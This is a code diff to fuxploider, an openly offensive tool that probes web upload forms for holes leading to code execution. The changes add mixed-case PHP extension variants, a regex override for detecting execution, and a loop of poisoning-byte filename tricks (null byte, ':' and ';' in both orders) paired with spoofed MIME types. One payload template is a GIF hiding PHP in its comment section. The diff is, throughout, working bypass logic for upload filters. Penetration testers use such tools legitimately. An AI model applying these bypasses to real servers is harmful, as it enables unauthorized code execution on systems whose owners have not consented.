@@ -2,7 +2,7 @@
 import re,requests,argparse,logging,os,coloredlogs,datetime,getpass,tempfile,itertools
 from utils import *
 from UploadForm import UploadForm
-
+signal.signal(signal.SIGINT, quitting)
 version = "0.2.2"
 logging.basicConfig(datefmt='[%m/%d/%Y-%H:%M:%S]')
 logger = logging.getLogger("fuxploider")
@@ -18,14 +18,14 @@ templates = [
 		"filename":"template.php",
 		"nastyExt":"php",
 		"codeExecRegex":"\\<title\\>phpinfo\\(\\)\\<\\/title\\>(.|\n)*\\<h2\\>PHP License\\<\\/h2\\>",
-		"extVariants":["php1","php2","php3","php4","php5","phtml","pht"]
+		"extVariants":["php1","php2","php3","php4","php5","phtml","pht","Php","PhP","pHp","pHp1","pHP2","pHtMl","PHp5"]
 	},{#malicious gif with php code in the comments section to bypass getimagesize() like functions
 		"templateName" : "nastygif",
 		"description" : "Valid GIF file with basic call to phpinfo() in the comments section of the file",
 		"filename":"template.gif",
 		"nastyExt":"php",
 		"codeExecRegex":"\\<title\\>phpinfo\\(\\)\\<\\/title\\>(.|\n)*\\<h2\\>PHP License\\<\\/h2\\>",
-		"extVariants":["php1","php2","php3","php4","php5","phtml","pht"]
+		"extVariants":["php1","php2","php3","php4","php5","phtml","pht","Php","PhP","pHp","pHp1","pHP2","pHtMl","PHp5"]
 	}
 ]
 #######################################################################
@@ -43,6 +43,7 @@ parser.add_argument("-f","--filesize",metavar="integer",nargs=1,default=["10"],d
 parser.add_argument("--cookies",metavar="omnomnom",nargs=1,dest="cookies",help="Cookies to use with HTTP requests. Example : PHPSESSID=aef45aef45afeaef45aef45&JSESSID=AQSEJHQSQSG",type=valid_postData)
 parser.add_argument("--uploads-path",default=[None],metavar="path",nargs=1,dest="uploadsPath",help="Path on the remote server where uploads are put. Example : '/tmp/uploads/'")
 parser.add_argument("-t","--template",metavar="templateName",nargs=1,dest="template",help="Malicious payload to use for code execution detection. Default is to use every known templates. For a complete list of templates, see the TEMPLATE section.")
+parser.add_argument("-r","--regex-override",metavar="regex",nargs=1,dest="regexOverride",help="Specify a regular expression to detect code execution. Overrides the default code execution detection regex defined in the template in use.",type=valid_regex)
 requiredNamedArgs = parser.add_argument_group('Required named arguments')
 requiredNamedArgs.add_argument("-u","--url", metavar="target", dest="url",required=True, help="Web page URL containing the file upload form to be tested. Example : http://test.com/index.html?action=upload", type=valid_url)
 requiredNamedArgs.add_argument("--not-regex", metavar="regex", help="Regex matching an upload failure", type=valid_regex,dest="notRegex")
@@ -68,10 +69,13 @@ if args.template :
 	if args.template not in templatesNames :
 		logging.warning("Unknown template : %s",args.template)
 		cont = input("Use default templates instead ? [Y/n]")
-		if cont not in ["y","Y","yes","YES","Yes",""] :
+		if not cont.lower().startswith("y") :
 			exit()
 	else :
 		templates = [[x for x in templates if x["templateName"] == args.template][0]]
+if args.regexOverride :
+	for t in templates :
+		t["codeExecRegex"] = args.regexOverride[0]
 
 args.verbosity = 0
 if args.verbose :
@@ -249,18 +253,11 @@ for template in templates :
 			attempts.append({"suffix":"."+legitExt+"."+nastyVariant,"mime":nastyMime})
 			##double extension good.bad with good mime type
 			attempts.append({"suffix":"."+legitExt+"."+nastyVariant,"mime":legitMime})
-			##null byte poisoning - legit mime type
-			attempts.append({"suffix":"."+nastyVariant+"%00."+legitExt,"mime":legitMime})
-			##null byte poisoning - nasty mime type
-			attempts.append({"suffix":"."+nastyVariant+"%00."+legitExt,"mime":nastyMime})
-			##':' byte poisoning - legit mime type
-			attempts.append({"suffix":"."+nastyVariant+":."+legitExt,"mime":legitMime})
-			##':' byte poisoning - nasty mime type
-			attempts.append({"suffix":"."+nastyVariant+":."+legitExt,"mime":nastyMime})
-			##';' byte poisoning - legit mime type
-			attempts.append({"suffix":"."+nastyVariant+";."+legitExt,"mime":legitMime})
-			##';' byte poisoning - nasty mime type
-			attempts.append({"suffix":"."+nastyVariant+";."+legitExt,"mime":nastyMime})
+			for b in getPoisoningBytes() :
+				attempts.append({"suffix":"."+nastyVariant+b+"."+legitExt,"mime":legitMime})
+				attempts.append({"suffix":"."+nastyVariant+b+"."+legitExt,"mime":nastyMime})
+				attempts.append({"suffix":"."+legitExt+b+"."+nastyVariant,"mime":legitMime})
+				attempts.append({"suffix":"."+legitExt+b+"."+nastyVariant,"mime":nastyMime})
 
 		for a in attempts :
 			suffix = a["suffix"]
@@ -276,7 +273,7 @@ for template in templates :
 				entryPoints.append(foundEntryPoint)
 				if not args.detectAllEntryPoints :
 					cont = input("Continue attacking ? [y/N] : ")
-					if cont not in ["y","Y","yes","YES","Yes"] :
+					if not cont.lower().startswith("y") :
 						wantToStop = True
 						break
 		i += 1
